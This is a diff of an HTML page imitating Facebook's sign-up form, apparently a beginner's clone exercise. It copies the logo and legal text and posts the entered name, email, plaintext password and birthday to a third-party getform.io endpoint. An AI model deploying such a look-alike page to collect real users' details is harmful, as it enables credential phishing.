@@ -8,83 +8,91 @@
         <link href="css/style.css" rel="stylesheet">
     </head>
     <body>
-        <section id="grid_container">
-            <header>
-                <img src="images/fb_logo.svg" class="center">
-            </header>
-            <main>
-                <form method="POST" action="https://getform.io/f/9d2b7593-4c6b-4121-b266-5f523adb461d">
-                        <div>
-                            <label for="help">
-                                <h1>Create a new account</h1>
-                                <p class="head">It's quick and easy.</p>
-                                <hr>
-                            </label>
-                        </div>
-                        <div id="names">
-                            <label for="fname"> </label>
-                            <input 
-                            required minlength="1"
-                            maxlength="12"
-                            type="text" name="name" id="fname" placeholder="First name">
-                            <label for="lname"></label>
-                            <input 
-                            required minlength="1"
-                            maxlength="12"
-                            type="text" name="name" id="lname" placeholder="Last name">
-                        </div>
-                        <div>
-                            <label for="emailid"></label>
-                            <input 
-                            required minlength="1"
-                            maxlength="35"
-                            type="email" name="email" id="emailid" placeholder="Mobile number or email ">
-                        </div>
-                        <div>
-                            <label for="password"></label>
-                            <input 
-                            required minlength="1"
-                            maxlength="15"
-                            type="text" name="password" id="password" placeholder="New password">
-                        </div>
-                        <p>Birthday</p>
-                        <div id="birthday">
-                            <label for="birthday">
-                            </label>
-                            <select id="birthday" name="birthday">
-                                <option value="jan">Jan</option>
-                                <option value="feb">Feb</option>
-                                <option value="mar">Mar</option>
-                            </select>
-                            <select id="birthday" name="birthday">
-                                <option value="1">1</option>
-                                <option value="2">2</option>
-                                <option value="3">3</option>
-                            </select>
-                            <select id="birthday" name="birthday">
-                                <option value="2021">2021</option>
-                                <option value="2022">2022</option>
-                                <option value="2023">2023</option>
-                            </select>
+            <div id="layout">
+                <header>
+                    <img src="images/fb_logo.svg" class="center">
+                </header>
+                <main>
+                    <form method="POST" action="https://getform.io/f/9d2b7593-4c6b-4121-b266-5f523adb461d">
+                            <div>
+                                <label for="help">
+                                    <h1>Create a new account</h1>
+                                    <h4 class="head">It's quick and easy.</h4>
+                                    <hr>
+                                </label>
                             </div>
-                            <p>Gender</p>
-                            <div id="gender">
-                                <input type="radio" id="female" name="gender" value="female">
-                                <label for="female_radio">Female</label>
+                            <div id="names">
+                                <label for="fname"> </label>
+                                <input 
+                                required minlength="1"
+                                maxlength="12"
+                                type="text" name="name" id="fname" placeholder="First name">
+                                <label for="lname"></label>
+                                <input 
+                                required minlength="1"
+                                maxlength="12"
+                                type="text" name="name" id="lname" placeholder="Last name">
                             </div>
-                            <div id="gender">
-                                <input type="radio" id="male" name="gender" value="Male">
-                                <label for="male_radio">Male</label>
+                            <div>
+                                <label for="emailid"></label>
+                                <input 
+                                required minlength="1"
+                                maxlength="35"
+                                type="email" name="email" id="emailid" placeholder="Mobile number or email ">
                             </div>
-                            <div id="gender">
-                                <input type="radio" id="custom" name="gender" value="custom">
-                                <label for="custom_radio">Custom</label>
+                            <div>
+                                <label for="password"></label>
+                                <input 
+                                required minlength="1"
+                                maxlength="15"
+                                type="text" name="password" id="password" placeholder="New password">
                             </div>
-                        <div>
-                            <input type="submit" value="Sign Up" id="signupid" class="button">
-                        </div>
-                </form>
+                            <p>Birthday</p>
+                            <div id="birthday">
+                                <select id="month" name="birthday">
+                                    <option value="jan">Jan</option>
+                                    <option value="feb">Feb</option>
+                                    <option value="mar">Mar</option>
+                                </select>
+                                <select id="day" name="birthday">
+                                    <option value="1">1</option>
+                                    <option value="2">2</option>
+                                    <option value="3">3</option>
+                                </select>
+                                <select id="year" name="birthday">
+                                    <option value="2021">2021</option>
+                                    <option value="2022">2022</option>
+                                    <option value="2023">2023</option>
+                                </select>
+                                </div>
+                                <p>Gender</p>
+                                <div id="gendercontainer">
+                                <div class="gender" id="female">
+                                    <input type="radio" id="female" name="gender" value="female">
+                                    <label for="female_radio">Female</label>
+                                </div>
+                                <div class="gender">
+                                    <input type="radio" id="male" name="gender" value="Male">
+                                    <label for="male_radio">Male</label>
+                                </div>
+                                <div class="gender" id="custom">
+                                    <input type="radio" id="custom" name="gender" value="custom">
+                                    <label for="custom_radio">Custom</label>
+                                </div>
+                                </div>
+                                <div id="dummy">
+                                    <p>People who use our service may have uploaded your contact information to Facebook. <a href="#">Learn more </a>.</p>
+                                    <br>
+                                    <p>By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>. You may receive SMS Notifications from us and can opt out any time.</p>
+                                </div>
+                            <div>
+                                <input type="submit" value="Sign Up" id="signupid" class="button">
+                            </div>
+                            <div id="account">
+                                <h2>Already have an account?</h2>
+                            </div>
+                    </form>
+                </div>
             </main>
-        </section>
     </body>
 </html>
